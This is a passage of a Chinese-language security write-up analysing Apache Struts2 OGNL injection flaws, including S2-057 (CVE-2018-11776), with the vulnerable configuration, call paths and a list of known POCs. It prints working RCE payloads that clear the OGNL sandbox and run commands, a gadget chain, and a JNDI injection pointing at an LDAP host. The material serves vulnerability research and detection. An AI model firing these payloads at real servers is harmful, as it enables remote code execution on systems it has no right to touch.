</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=err>&lt;</span>@s.url value=&#34;%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#39;whoami&#39;).(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds=(#iswin?{&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd}:{&#39;/bin/bash&#39;,&#39;-c&#39;,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
</span></span><span class=line><span class=cl>&#34;/&gt;
</span></span></code></pre></td></tr></table></div></div><p>此时再被Struts2的标签进行处理，由于标签存在Ognl表达式注入，所以造成漏洞；</p><p>这个标签的处理类为 <code>org.apache.struts2.components.URL</code> ，漏洞触发点在其 <code>start(Writer writer)</code> 方法。调用栈如下：</p><p><img src=/media/image-20210817150451734.png alt=image-20210817150451734></p><p>RCE证明如下：</p><p><img src=/media/image-20210817150540591.png alt=image-20210817150540591></p><h2 id=s2-057>S2-057</h2><p>影响版本：Struts 2.0.4 - Struts 2.3.34, Struts 2.5.0 - Struts 2.5.16</p><p>CVE编号：CVE-2018-11776</p><p>POC如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=o>/%</span><span class=n>24</span><span class=o>%</span><span class=n>7B</span><span class=o>%</span><span class=n>28</span><span class=o>%</span><span class=n>23_memberAccess</span><span class=o>%</span><span class=n>3D</span><span class=nd>@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS</span><span class=o>%</span><span class=n>29</span><span class=o>.%</span><span class=n>28</span><span class=o>%</span><span class=n>23w</span><span class=o>%</span><span class=n>3D</span><span class=o>%</span><span class=n>23context</span><span class=o>.</span><span class=na>get</span><span class=o>%</span><span class=n>28</span><span class=o>%</span><span class=n>22com</span><span class=o>.</span><span class=na>opensymphony</span><span class=o>.</span><span class=na>xwork2</span><span class=o>.</span><span class=na>dispatcher</span><span class=o>.</span><span class=na>HttpServletResponse</span><span class=o>%</span><span class=n>22</span><span class=o>%</span><span class=n>29</span><span class=o>.</span><span class=na>getWriter</span><span class=o>%</span><span class=n>28</span><span class=o>%</span><span class=n>29</span><span class=o>%</span><span class=n>29</span><span class=o>.%</span><span class=n>28</span><span class=o>%</span><span class=n>23w</span><span class=o>.</span><span class=na>print</span><span class=o>%</span><span class=n>28</span><span class=nd>@org.apache.commons.io.IOUtils@toString</span><span class=o>%</span><span class=n>28</span><span class=nd>@java.lang.Runtime@getRuntime</span><span class=o>%</span><span class=n>28</span><span class=o>%</span><span class=n>29</span><span class=o>.</span><span class=na>exec</span><span class=o>%</span><span class=n>28</span><span class=o>%</span><span class=n>27whoami</span><span class=o>%</span><span class=n>27</span><span class=o>%</span><span class=n>29</span><span class=o>.</span><span class=na>getInputStream</span><span class=o>%</span><span class=n>28</span><span class=o>%</span><span class=n>29</span><span class=o>%</span><span class=n>29</span><span class=o>%</span><span class=n>29</span><span class=o>%</span><span class=n>29</span><span class=o>.%</span><span class=n>28</span><span class=o>%</span><span class=n>23w</span><span class=o>.</span><span class=na>close</span><span class=o>%</span><span class=n>28</span><span class=o>%</span><span class=n>29</span><span class=o>%</span><span class=n>29</span><span class=o>%</span><span class=n>7D</span><span class=o>/</span><span class=n>index</span><span class=o>.</span><span class=na>action</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>/%</span><span class=n>24</span><span class=o>%</span><span class=n>7B</span><span class=o>%</span><span class=n>28</span><span class=o>%</span><span class=n>23dm</span><span class=o>%</span><span class=n>3D</span><span class=nd>@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS</span><span class=o>%</span><span class=n>29</span><span class=o>.%</span><span class=n>28</span><span class=o>%</span><span class=n>23ct</span><span class=o>%</span><span class=n>3D</span><span class=o>%</span><span class=n>23request</span><span class=o>%</span><span class=n>5B</span><span class=o>%</span><span class=n>27struts</span><span class=o>.</span><span class=na>valueStack</span><span class=o>%</span><span class=n>27</span><span class=o>%</span><span class=n>5D</span><span class=o>.</span><span class=na>context</span><span class=o>%</span><span class=n>29</span><span class=o>.%</span><span class=n>28</span><span class=o>%</span><span class=n>23cr</span><span class=o>%</span><span class=n>3D</span><span class=o>%</span><span class=n>23ct</span><span class=o>%</span><span class=n>5B</span><span class=o>%</span><span class=n>27com</span><span class=o>.</span><span class=na>opensymphony</span><span class=o>.</span><span class=na>xwork2</span><span class=o>.</span><span class=na>ActionContext</span><span class=o>.</span><span class=na>container</span><span class=o>%</span><span class=n>27</span><span class=o>%</span><span class=n>5D</span><span class=o>%</span><span class=n>29</span><span class=o>.%</span><span class=n>28</span><span class=o>%</span><span class=n>23ou</span><span class=o>%</span><span class=n>3D</span><span class=o>%</span><span class=n>23cr</span><span class=o>.</span><span class=na>getInstance</span><span class=o>%</span><span class=n>28</span><span class=nd>@com.opensymphony.xwork2.ognl.OgnlUtil@class</span><span class=o>%</span><span class=n>29</span><span class=o>%</span><span class=n>29</span><span class=o>.%</span><span class=n>28</span><span class=o>%</span><span class=n>23ou</span><span class=o>.</span><span class=na>getExcludedPackageNames</span><span class=o>%</span><span class=n>28</span><span class=o>%</span><span class=n>29</span><span class=o>.</span><span class=na>clear</span><span class=o>%</span><span class=n>28</span><span class=o>%</span><span class=n>29</span><span class=o>%</span><span class=n>29</span><span class=o>.%</span><span class=n>28</span><span class=o>%</span><span class=n>23ou</span><span class=o>.</span><span class=na>getExcludedClasses</span><span class=o>%</span><span class=n>28</span><span class=o>%</span><span class=n>29</span><span class=o>.</span><span class=na>clear</span><span class=o>%</span><span class=n>28</span><span class=o>%</span><span class=n>29</span><span class=o>%</span><span class=n>29</span><span class=o>.%</span><span class=n>28</span><span class=o>%</span><span class=n>23ct</span><span class=o>.</span><span class=na>setMemberAccess</span><span class=o>%</span><span class=n>28</span><span class=o>%</span><span class=n>23dm</span><span class=o>%</span><span class=n>29</span><span class=o>%</span><span class=n>29</span><span class=o>.%</span><span class=n>28</span><span class=o>%</span><span class=n>23w</span><span class=o>%</span><span class=n>3D</span><span class=o>%</span><span class=n>23ct</span><span class=o>.</span><span class=na>get</span><span class=o>%</span><span class=n>28</span><span class=o>%</span><span class=n>22com</span><span class=o>.</span><span class=na>opensymphony</span><span class=o>.</span><span class=na>xwork2</span><span class=o>.</span><span class=na>dispatcher</span><span class=o>.</span><span class=na>HttpServletResponse</span><span class=o>%</span><span class=n>22</span><span class=o>%</span><span class=n>29</span><span class=o>.</span><span class=na>getWriter</span><span class=o>%</span><span class=n>28</span><span class=o>%</span><span class=n>29</span><span class=o>%</span><span class=n>29</span><span class=o>.%</span><span class=n>28</span><span class=o>%</span><span class=n>23w</span><span class=o>.</span><span class=na>print</span><span class=o>%</span><span class=n>28</span><span class=nd>@org.apache.commons.io.IOUtils@toString</span><span class=o>%</span><span class=n>28</span><span class=nd>@java.lang.Runtime@getRuntime</span><span class=o>%</span><span class=n>28</span><span class=o>%</span><span class=n>29</span><span class=o>.</span><span class=na>exec</span><span class=o>%</span><span class=n>28</span><span class=o>%</span><span class=n>27whoami</span><span class=o>%</span><span class=n>27</span><span class=o>%</span><span class=n>29</span><span class=o>.</span><span class=na>getInputStream</span><span class=o>%</span><span class=n>28</span><span class=o>%</span><span class=n>29</span><span class=o>%</span><span class=n>29</span><span class=o>%</span><span class=n>29</span><span class=o>%</span><span class=n>29</span><span class=o>.%</span><span class=n>28</span><span class=o>%</span><span class=n>23w</span><span class=o>.</span><span class=na>close</span><span class=o>%</span><span class=n>28</span><span class=o>%</span><span class=n>29</span><span class=o>%</span><span class=n>29</span><span class=o>%</span><span class=n>7D</span><span class=o>/</span><span class=n>index</span><span class=o>.</span><span class=na>action</span>
</span></span></code></pre></td></tr></table></div></div><p>这个漏洞需要存在类似如下的配置：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;struts&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;constant</span> <span class=na>name=</span><span class=s>&#34;struts.mapper.alwaysSelectFullNamespace&#34;</span> <span class=na>value=</span><span class=s>&#34;true&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;constant</span> <span class=na>name=</span><span class=s>&#34;struts.devMode&#34;</span> <span class=na>value=</span><span class=s>&#34;false&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;constant</span> <span class=na>name=</span><span class=s>&#34;struts.enable.DynamicMethodInvocation&#34;</span> <span class=na>value=</span><span class=s>&#34;false&#34;</span> <span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;package</span> <span class=na>name=</span><span class=s>&#34;struts2&#34;</span> <span class=na>extends=</span><span class=s>&#34;struts-default&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;action</span> <span class=na>name=</span><span class=s>&#34;index&#34;</span> <span class=na>class=</span><span class=s>&#34;demo.Index&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;result</span> <span class=na>type=</span><span class=s>&#34;redirectAction&#34;</span> <span class=na>name=</span><span class=s>&#34;SUCCESS&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>                <span class=nt>&lt;param</span> <span class=na>name=</span><span class=s>&#34;actionName&#34;</span><span class=nt>&gt;</span>test<span class=nt>&lt;/param&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;/result&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;/action&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;/package&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;package</span> <span class=na>name=</span><span class=s>&#34;struts3&#34;</span> <span class=na>extends=</span><span class=s>&#34;struts-default&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;action</span> <span class=na>name=</span><span class=s>&#34;test&#34;</span> <span class=na>class=</span><span class=s>&#34;demo.Index&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;result</span> <span class=na>type=</span><span class=s>&#34;freemarker&#34;</span> <span class=na>name=</span><span class=s>&#34;SUCCESS&#34;</span><span class=nt>&gt;</span>/WEB-INF/ftl/index.ftl<span class=nt>&lt;/result&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;/action&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;/package&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/struts&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>主要是需要配置如下两个配置：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;constant</span> <span class=na>name=</span><span class=s>&#34;struts.mapper.alwaysSelectFullNamespace&#34;</span> <span class=na>value=</span><span class=s>&#34;true&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nt>&lt;result</span> <span class=na>type=</span><span class=s>&#34;redirectAction&#34;</span> <span class=na>name=</span><span class=s>&#34;SUCCESS&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;param</span> <span class=na>name=</span><span class=s>&#34;actionName&#34;</span><span class=nt>&gt;</span>test<span class=nt>&lt;/param&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/result&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>关于 <code>&lt;constant name="struts.mapper.alwaysSelectFullNamespace" value="false"/></code> 的配置，一些说明如下：</p><ul><li>这个配置用来设置是否 <strong>允许采用完整的命名空间</strong> ，当配置为true时，即 <strong>设置命名空间必须进行精确匹配</strong> ；</li><li>进行精确匹配时要求请求url中的命名空间必须与配置文件中配置的某个命名空间必须相同，如果没有找到相同的则匹配失败；</li><li>进行精确匹配时，以最后一个 <code>/</code> 为分隔符，左边的为namespace，右边的为action；</li></ul><p>例如URL为： <code>http://localhost:8080/myproject/home/actionName!method.action</code> ，那么进行精确匹配时，namespace就为home。</p><p>然后这个漏洞的产生点是 <code>&lt;result type="redirectAction" name="SUCCESS"></code> 中配置的 <code>redirectAction</code> 。其实这个漏洞还有其他两个result type可以触发：</p><ul><li>type=&ldquo;chain&rdquo;</li><li>type=&ldquo;postback&rdquo;</li></ul><p>这里我们以 <code>type="redirectAction"</code> 为例进行分析。发送POC后，直接看到 <code>type="redirectAction"</code> 对应的 <code>org.apache.struts2.result.ServletActionRedirectResult#execute(ActionInvocation invocation)</code> 方法：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span> <span class=kt>void</span> <span class=nf>execute</span><span class=o>(</span><span class=n>ActionInvocation</span> <span class=n>invocation</span><span class=o>)</span> <span class=kd>throws</span> <span class=n>Exception</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=n>actionName</span> <span class=o>=</span> <span class=n>conditionalParse</span><span class=o>(</span><span class=n>actionName</span><span class=o>,</span> <span class=n>invocation</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=n>namespace</span> <span class=o>==</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>namespace</span> <span class=o>=</span> <span class=n>invocation</span><span class=o>.</span><span class=na>getProxy</span><span class=o>().</span><span class=na>getNamespace</span><span class=o>();</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span> <span class=k>else</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>namespace</span> <span class=o>=</span> <span class=n>conditionalParse</span><span class=o>(</span><span class=n>namespace</span><span class=o>,</span> <span class=n>invocation</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=n>method</span> <span class=o>==</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>method</span> <span class=o>=</span> <span class=s>&#34;&#34;</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span> <span class=k>else</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>method</span> <span class=o>=</span> <span class=n>conditionalParse</span><span class=o>(</span><span class=n>method</span><span class=o>,</span> <span class=n>invocation</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>String</span> <span class=n>tmpLocation</span> <span class=o>=</span> <span class=n>actionMapper</span><span class=o>.</span><span class=na>getUriFromActionMapping</span><span class=o>(</span><span class=k>new</span> <span class=n>ActionMapping</span><span class=o>(</span><span class=n>actionName</span><span class=o>,</span> <span class=n>namespace</span><span class=o>,</span> <span class=n>method</span><span class=o>,</span> <span class=kc>null</span><span class=o>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>setLocation</span><span class=o>(</span><span class=n>tmpLocation</span><span class=o>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>super</span><span class=o>.</span><span class=na>execute</span><span class=o>(</span><span class=n>invocation</span><span class=o>);</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>因为前面配置了必须精确匹配命名空间，所以这里 <code>namespace = invocation.getProxy().getNamespace()</code> 获取到的就是攻击者在URL中填写的恶意Ognl表达式：</p><p><img src=/media/image-20210817162036486.png alt=image-20210817162036486></p><p>最终从 <code>super.execute(invocation)</code> 一直到如下代码：</p><p><img src=/media/image-20210817162203005.png alt=image-20210817162203005></p><p>跟进 <code>conditionalParse(location, invocation)</code> ，可以看到，又到了 <code>TextParseUtil.translateVariables()</code> ，这是个分析过很多次的Ognl表达式RCE Sink了，底层进行了Ognl表达式解析，从而触发RCE，这里不再分析底层调用了：</p><p><img src=/media/image-20210817162426585.png alt=image-20210817162426585></p><p>RCE证明如下：</p><p><img src=/media/image-20210817162512882.png alt=image-20210817162512882></p><h2 id=总结>总结</h2><p>这里匆匆忙忙过了一遍Ognl的注入点，但是其实，找到Ognl表达式注入点，可能还得绕沙箱（没有过多分析沙箱绕过，大多数只分析了Ognl表达式注入点）。值得一提的是S2-061中pwntester提出的 <code>org.apache.tomcat.InstanceManager</code> 的这个Gadget，有非常强的扩展性。（conf velocity沙箱逃逸那个RCE漏洞中也用到了）。例如：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=c1>// 以下为调用栈，非直接利用的POC
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>(</span><span class=err>#</span><span class=n>UnicodeSec</span> <span class=o>=</span> <span class=err>#</span><span class=n>application</span><span class=o>[</span><span class=err>&#39;</span><span class=n>org</span><span class=o>.</span><span class=na>apache</span><span class=o>.</span><span class=na>tomcat</span><span class=o>.</span><span class=na>InstanceManager</span><span class=err>&#39;</span><span class=o>])</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=err>#</span><span class=n>potats0</span><span class=o>=</span><span class=err>#</span><span class=n>UnicodeSec</span><span class=o>.</span><span class=na>newInstance</span><span class=o>(</span><span class=err>&#39;</span><span class=n>org</span><span class=o>.</span><span class=na>apache</span><span class=o>.</span><span class=na>commons</span><span class=o>.</span><span class=na>collections</span><span class=o>.</span><span class=na>BeanMap</span><span class=err>&#39;</span><span class=o>))</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=err>#</span><span class=n>stackvalue</span><span class=o>=</span><span class=err>#</span><span class=n>attr</span><span class=o>[</span><span class=err>&#39;</span><span class=n>struts</span><span class=o>.</span><span class=na>valueStack</span><span class=err>&#39;</span><span class=o>])</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=err>#</span><span class=n>potats0</span><span class=o>.</span><span class=na>setBean</span><span class=o>(</span><span class=err>#</span><span class=n>stackvalue</span><span class=o>))</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=err>#</span><span class=n>context</span><span class=o>=</span><span class=err>#</span><span class=n>potats0</span><span class=o>.</span><span class=na>get</span><span class=o>(</span><span class=err>&#39;</span><span class=n>context</span><span class=err>&#39;</span><span class=o>))</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=err>#</span><span class=n>potats0</span><span class=o>.</span><span class=na>setBean</span><span class=o>(</span><span class=err>#</span><span class=n>context</span><span class=o>))</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=err>#</span><span class=n>sm</span><span class=o>=</span><span class=err>#</span><span class=n>potats0</span><span class=o>.</span><span class=na>get</span><span class=o>(</span><span class=err>&#39;</span><span class=n>memberAccess</span><span class=err>&#39;</span><span class=o>))</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=err>#</span><span class=n>emptySet</span><span class=o>=</span><span class=err>#</span><span class=n>UnicodeSec</span><span class=o>.</span><span class=na>newInstance</span><span class=o>(</span><span class=err>&#39;</span><span class=n>java</span><span class=o>.</span><span class=na>util</span><span class=o>.</span><span class=na>HashSet</span><span class=err>&#39;</span><span class=o>))</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=err>#</span><span class=n>potats0</span><span class=o>.</span><span class=na>setBean</span><span class=o>(</span><span class=err>#</span><span class=n>sm</span><span class=o>))</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=err>#</span><span class=n>potats0</span><span class=o>.</span><span class=na>put</span><span class=o>(</span><span class=err>&#39;</span><span class=n>excludedClasses</span><span class=err>&#39;</span><span class=o>,</span><span class=err>#</span><span class=n>emptySet</span><span class=o>))</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=err>#</span><span class=n>potats0</span><span class=o>.</span><span class=na>put</span><span class=o>(</span><span class=err>&#39;</span><span class=n>excludedPackageNames</span><span class=err>&#39;</span><span class=o>,</span><span class=err>#</span><span class=n>emptySet</span><span class=o>))</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=err>#</span><span class=n>exec</span><span class=o>=</span><span class=err>#</span><span class=n>UnicodeSec</span><span class=o>.</span><span class=na>newInstance</span><span class=o>(</span><span class=err>&#39;</span><span class=n>freemarker</span><span class=o>.</span><span class=na>template</span><span class=o>.</span><span class=na>utility</span><span class=o>.</span><span class=na>Execute</span><span class=err>&#39;</span><span class=o>))</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=err>#</span><span class=n>cmd</span><span class=o>={</span><span class=err>&#39;</span><span class=n>whoami</span><span class=err>&#39;</span><span class=o>})</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=err>#</span><span class=n>res</span><span class=o>=</span><span class=err>#</span><span class=n>exec</span><span class=o>.</span><span class=na>exec</span><span class=o>(</span><span class=err>#</span><span class=n>cmd</span><span class=o>))</span>
</span></span></code></pre></td></tr></table></div></div><p>它可以直接无视沙箱new一个对象，这样就有很多可能性了。扩展下也可以使用这个Gadget构造一个JNDI注入：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>%{(#InstanceManager = #application[&#39;org.apache.tomcat.InstanceManager&#39;]).(#rw=#InstanceManager.newInstance(&#39;com.sun.rowset.JdbcRowSetImpl&#39;)).(#rw.setDataSourceName(&#39;ldap://192.168.3.254:10086/InstanceManager&#39;)).(#rw.getDatabaseMetaData())}
</span></span></code></pre></td></tr></table></div></div><h2 id=流量特征>流量特征</h2><p>首先汇总下目前已知的POC：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=c1>// S2-005之前，没有沙箱，可以直接Ognl执行命令
</span></span></span><span class=line><span class=cl><span class=c1>// 所以S2-005之前无需沙箱绕过
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>%{(</span><span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>ProcessBuilder</span><span class=o>(</span><span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>String</span><span class=o>[]{</span><span class=s>&#34;calc&#34;</span><span class=o>})).</span><span class=na>start</span><span class=o>()}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>%{</span><span class=nd>@java.lang.Runtime@getRuntime</span><span class=o>().</span><span class=na>exec</span><span class=o>(</span><span class=s>&#34;calc&#34;</span><span class=o>)}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// 以及一些S2-005之前的非RCE Payload如下
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>%{</span><span class=s>&#34;tomcatBinDir{&#34;</span> <span class=nd>@java.lang.System@getProperty</span><span class=o>(</span><span class=s>&#34;user.dir&#34;</span><span class=o>)</span> <span class=s>&#34;}&#34;</span><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>%{</span><span class=err>#</span><span class=n>req</span><span class=o>=</span><span class=nd>@org.apache.struts2.ServletActionContext@getRequest</span><span class=o>(),</span><span class=err>#</span><span class=n>response</span><span class=o>=</span><span class=err>#</span><span class=n>context</span><span class=o>.</span><span class=na>get</span><span class=o>(</span><span class=s>&#34;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#34;</span><span class=o>).</span><span class=na>getWriter</span><span class=o>(),</span><span class=err>#</span><span class=n>response</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=err>#</span><span class=n>req</span><span class=o>.</span><span class=na>getRealPath</span><span class=o>(</span><span class=sc>&#39;/&#39;</span><span class=o>)),</span><span class=err>#</span><span class=n>response</span><span class=o>.</span><span class=na>flush</span><span class=o>(),</span><span class=err>#</span><span class=n>response</span><span class=o>.</span><span class=na>close</span><span class=o>()}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// S2-005开始，存在沙箱，此时Ognl表达式注入需要绕沙箱（通过Ognl关闭沙箱）
</span></span></span><span class=line><span class=cl><span class=c1>// Struts2的OgnlContext配置的沙箱处理器为SecurityMemberAccess
</span></span></span><span class=line><span class=cl><span class=c1>// 对应于OgnlContext的_memberAccess属性
</span></span></span><span class=line><span class=cl><span class=c1>// 此外，Struts2还通过配置denyMethodExecution来判定是否允许Ognl执行函数
</span></span></span><span class=line><span class=cl><span class=c1>// 所以从S2-005开始，POC都是类似如下形式：
</span></span></span><span class=line><span class=cl><span class=c1>// 利用Ognl将denyMethodExecution设置为true，同时拿到_memberAccess，将其中的安全配置清空
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>(</span><span class=err>&#39;\</span><span class=n>u0023_memberAccess</span><span class=o>.</span><span class=na>allowStaticMethodAccess</span><span class=err>\</span><span class=n>u003dtrue</span><span class=err>&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>)(</span><span class=n>bla</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=err>&#39;\</span><span class=n>u0023context</span><span class=o>[</span><span class=err>\&#39;</span><span class=n>xwork</span><span class=o>.</span><span class=na>MethodAccessor</span><span class=o>.</span><span class=na>denyMethodExecution</span><span class=err>\&#39;</span><span class=o>]</span><span class=err>\</span><span class=n>u003dfalse</span><span class=err>&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>)(</span><span class=n>bla</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
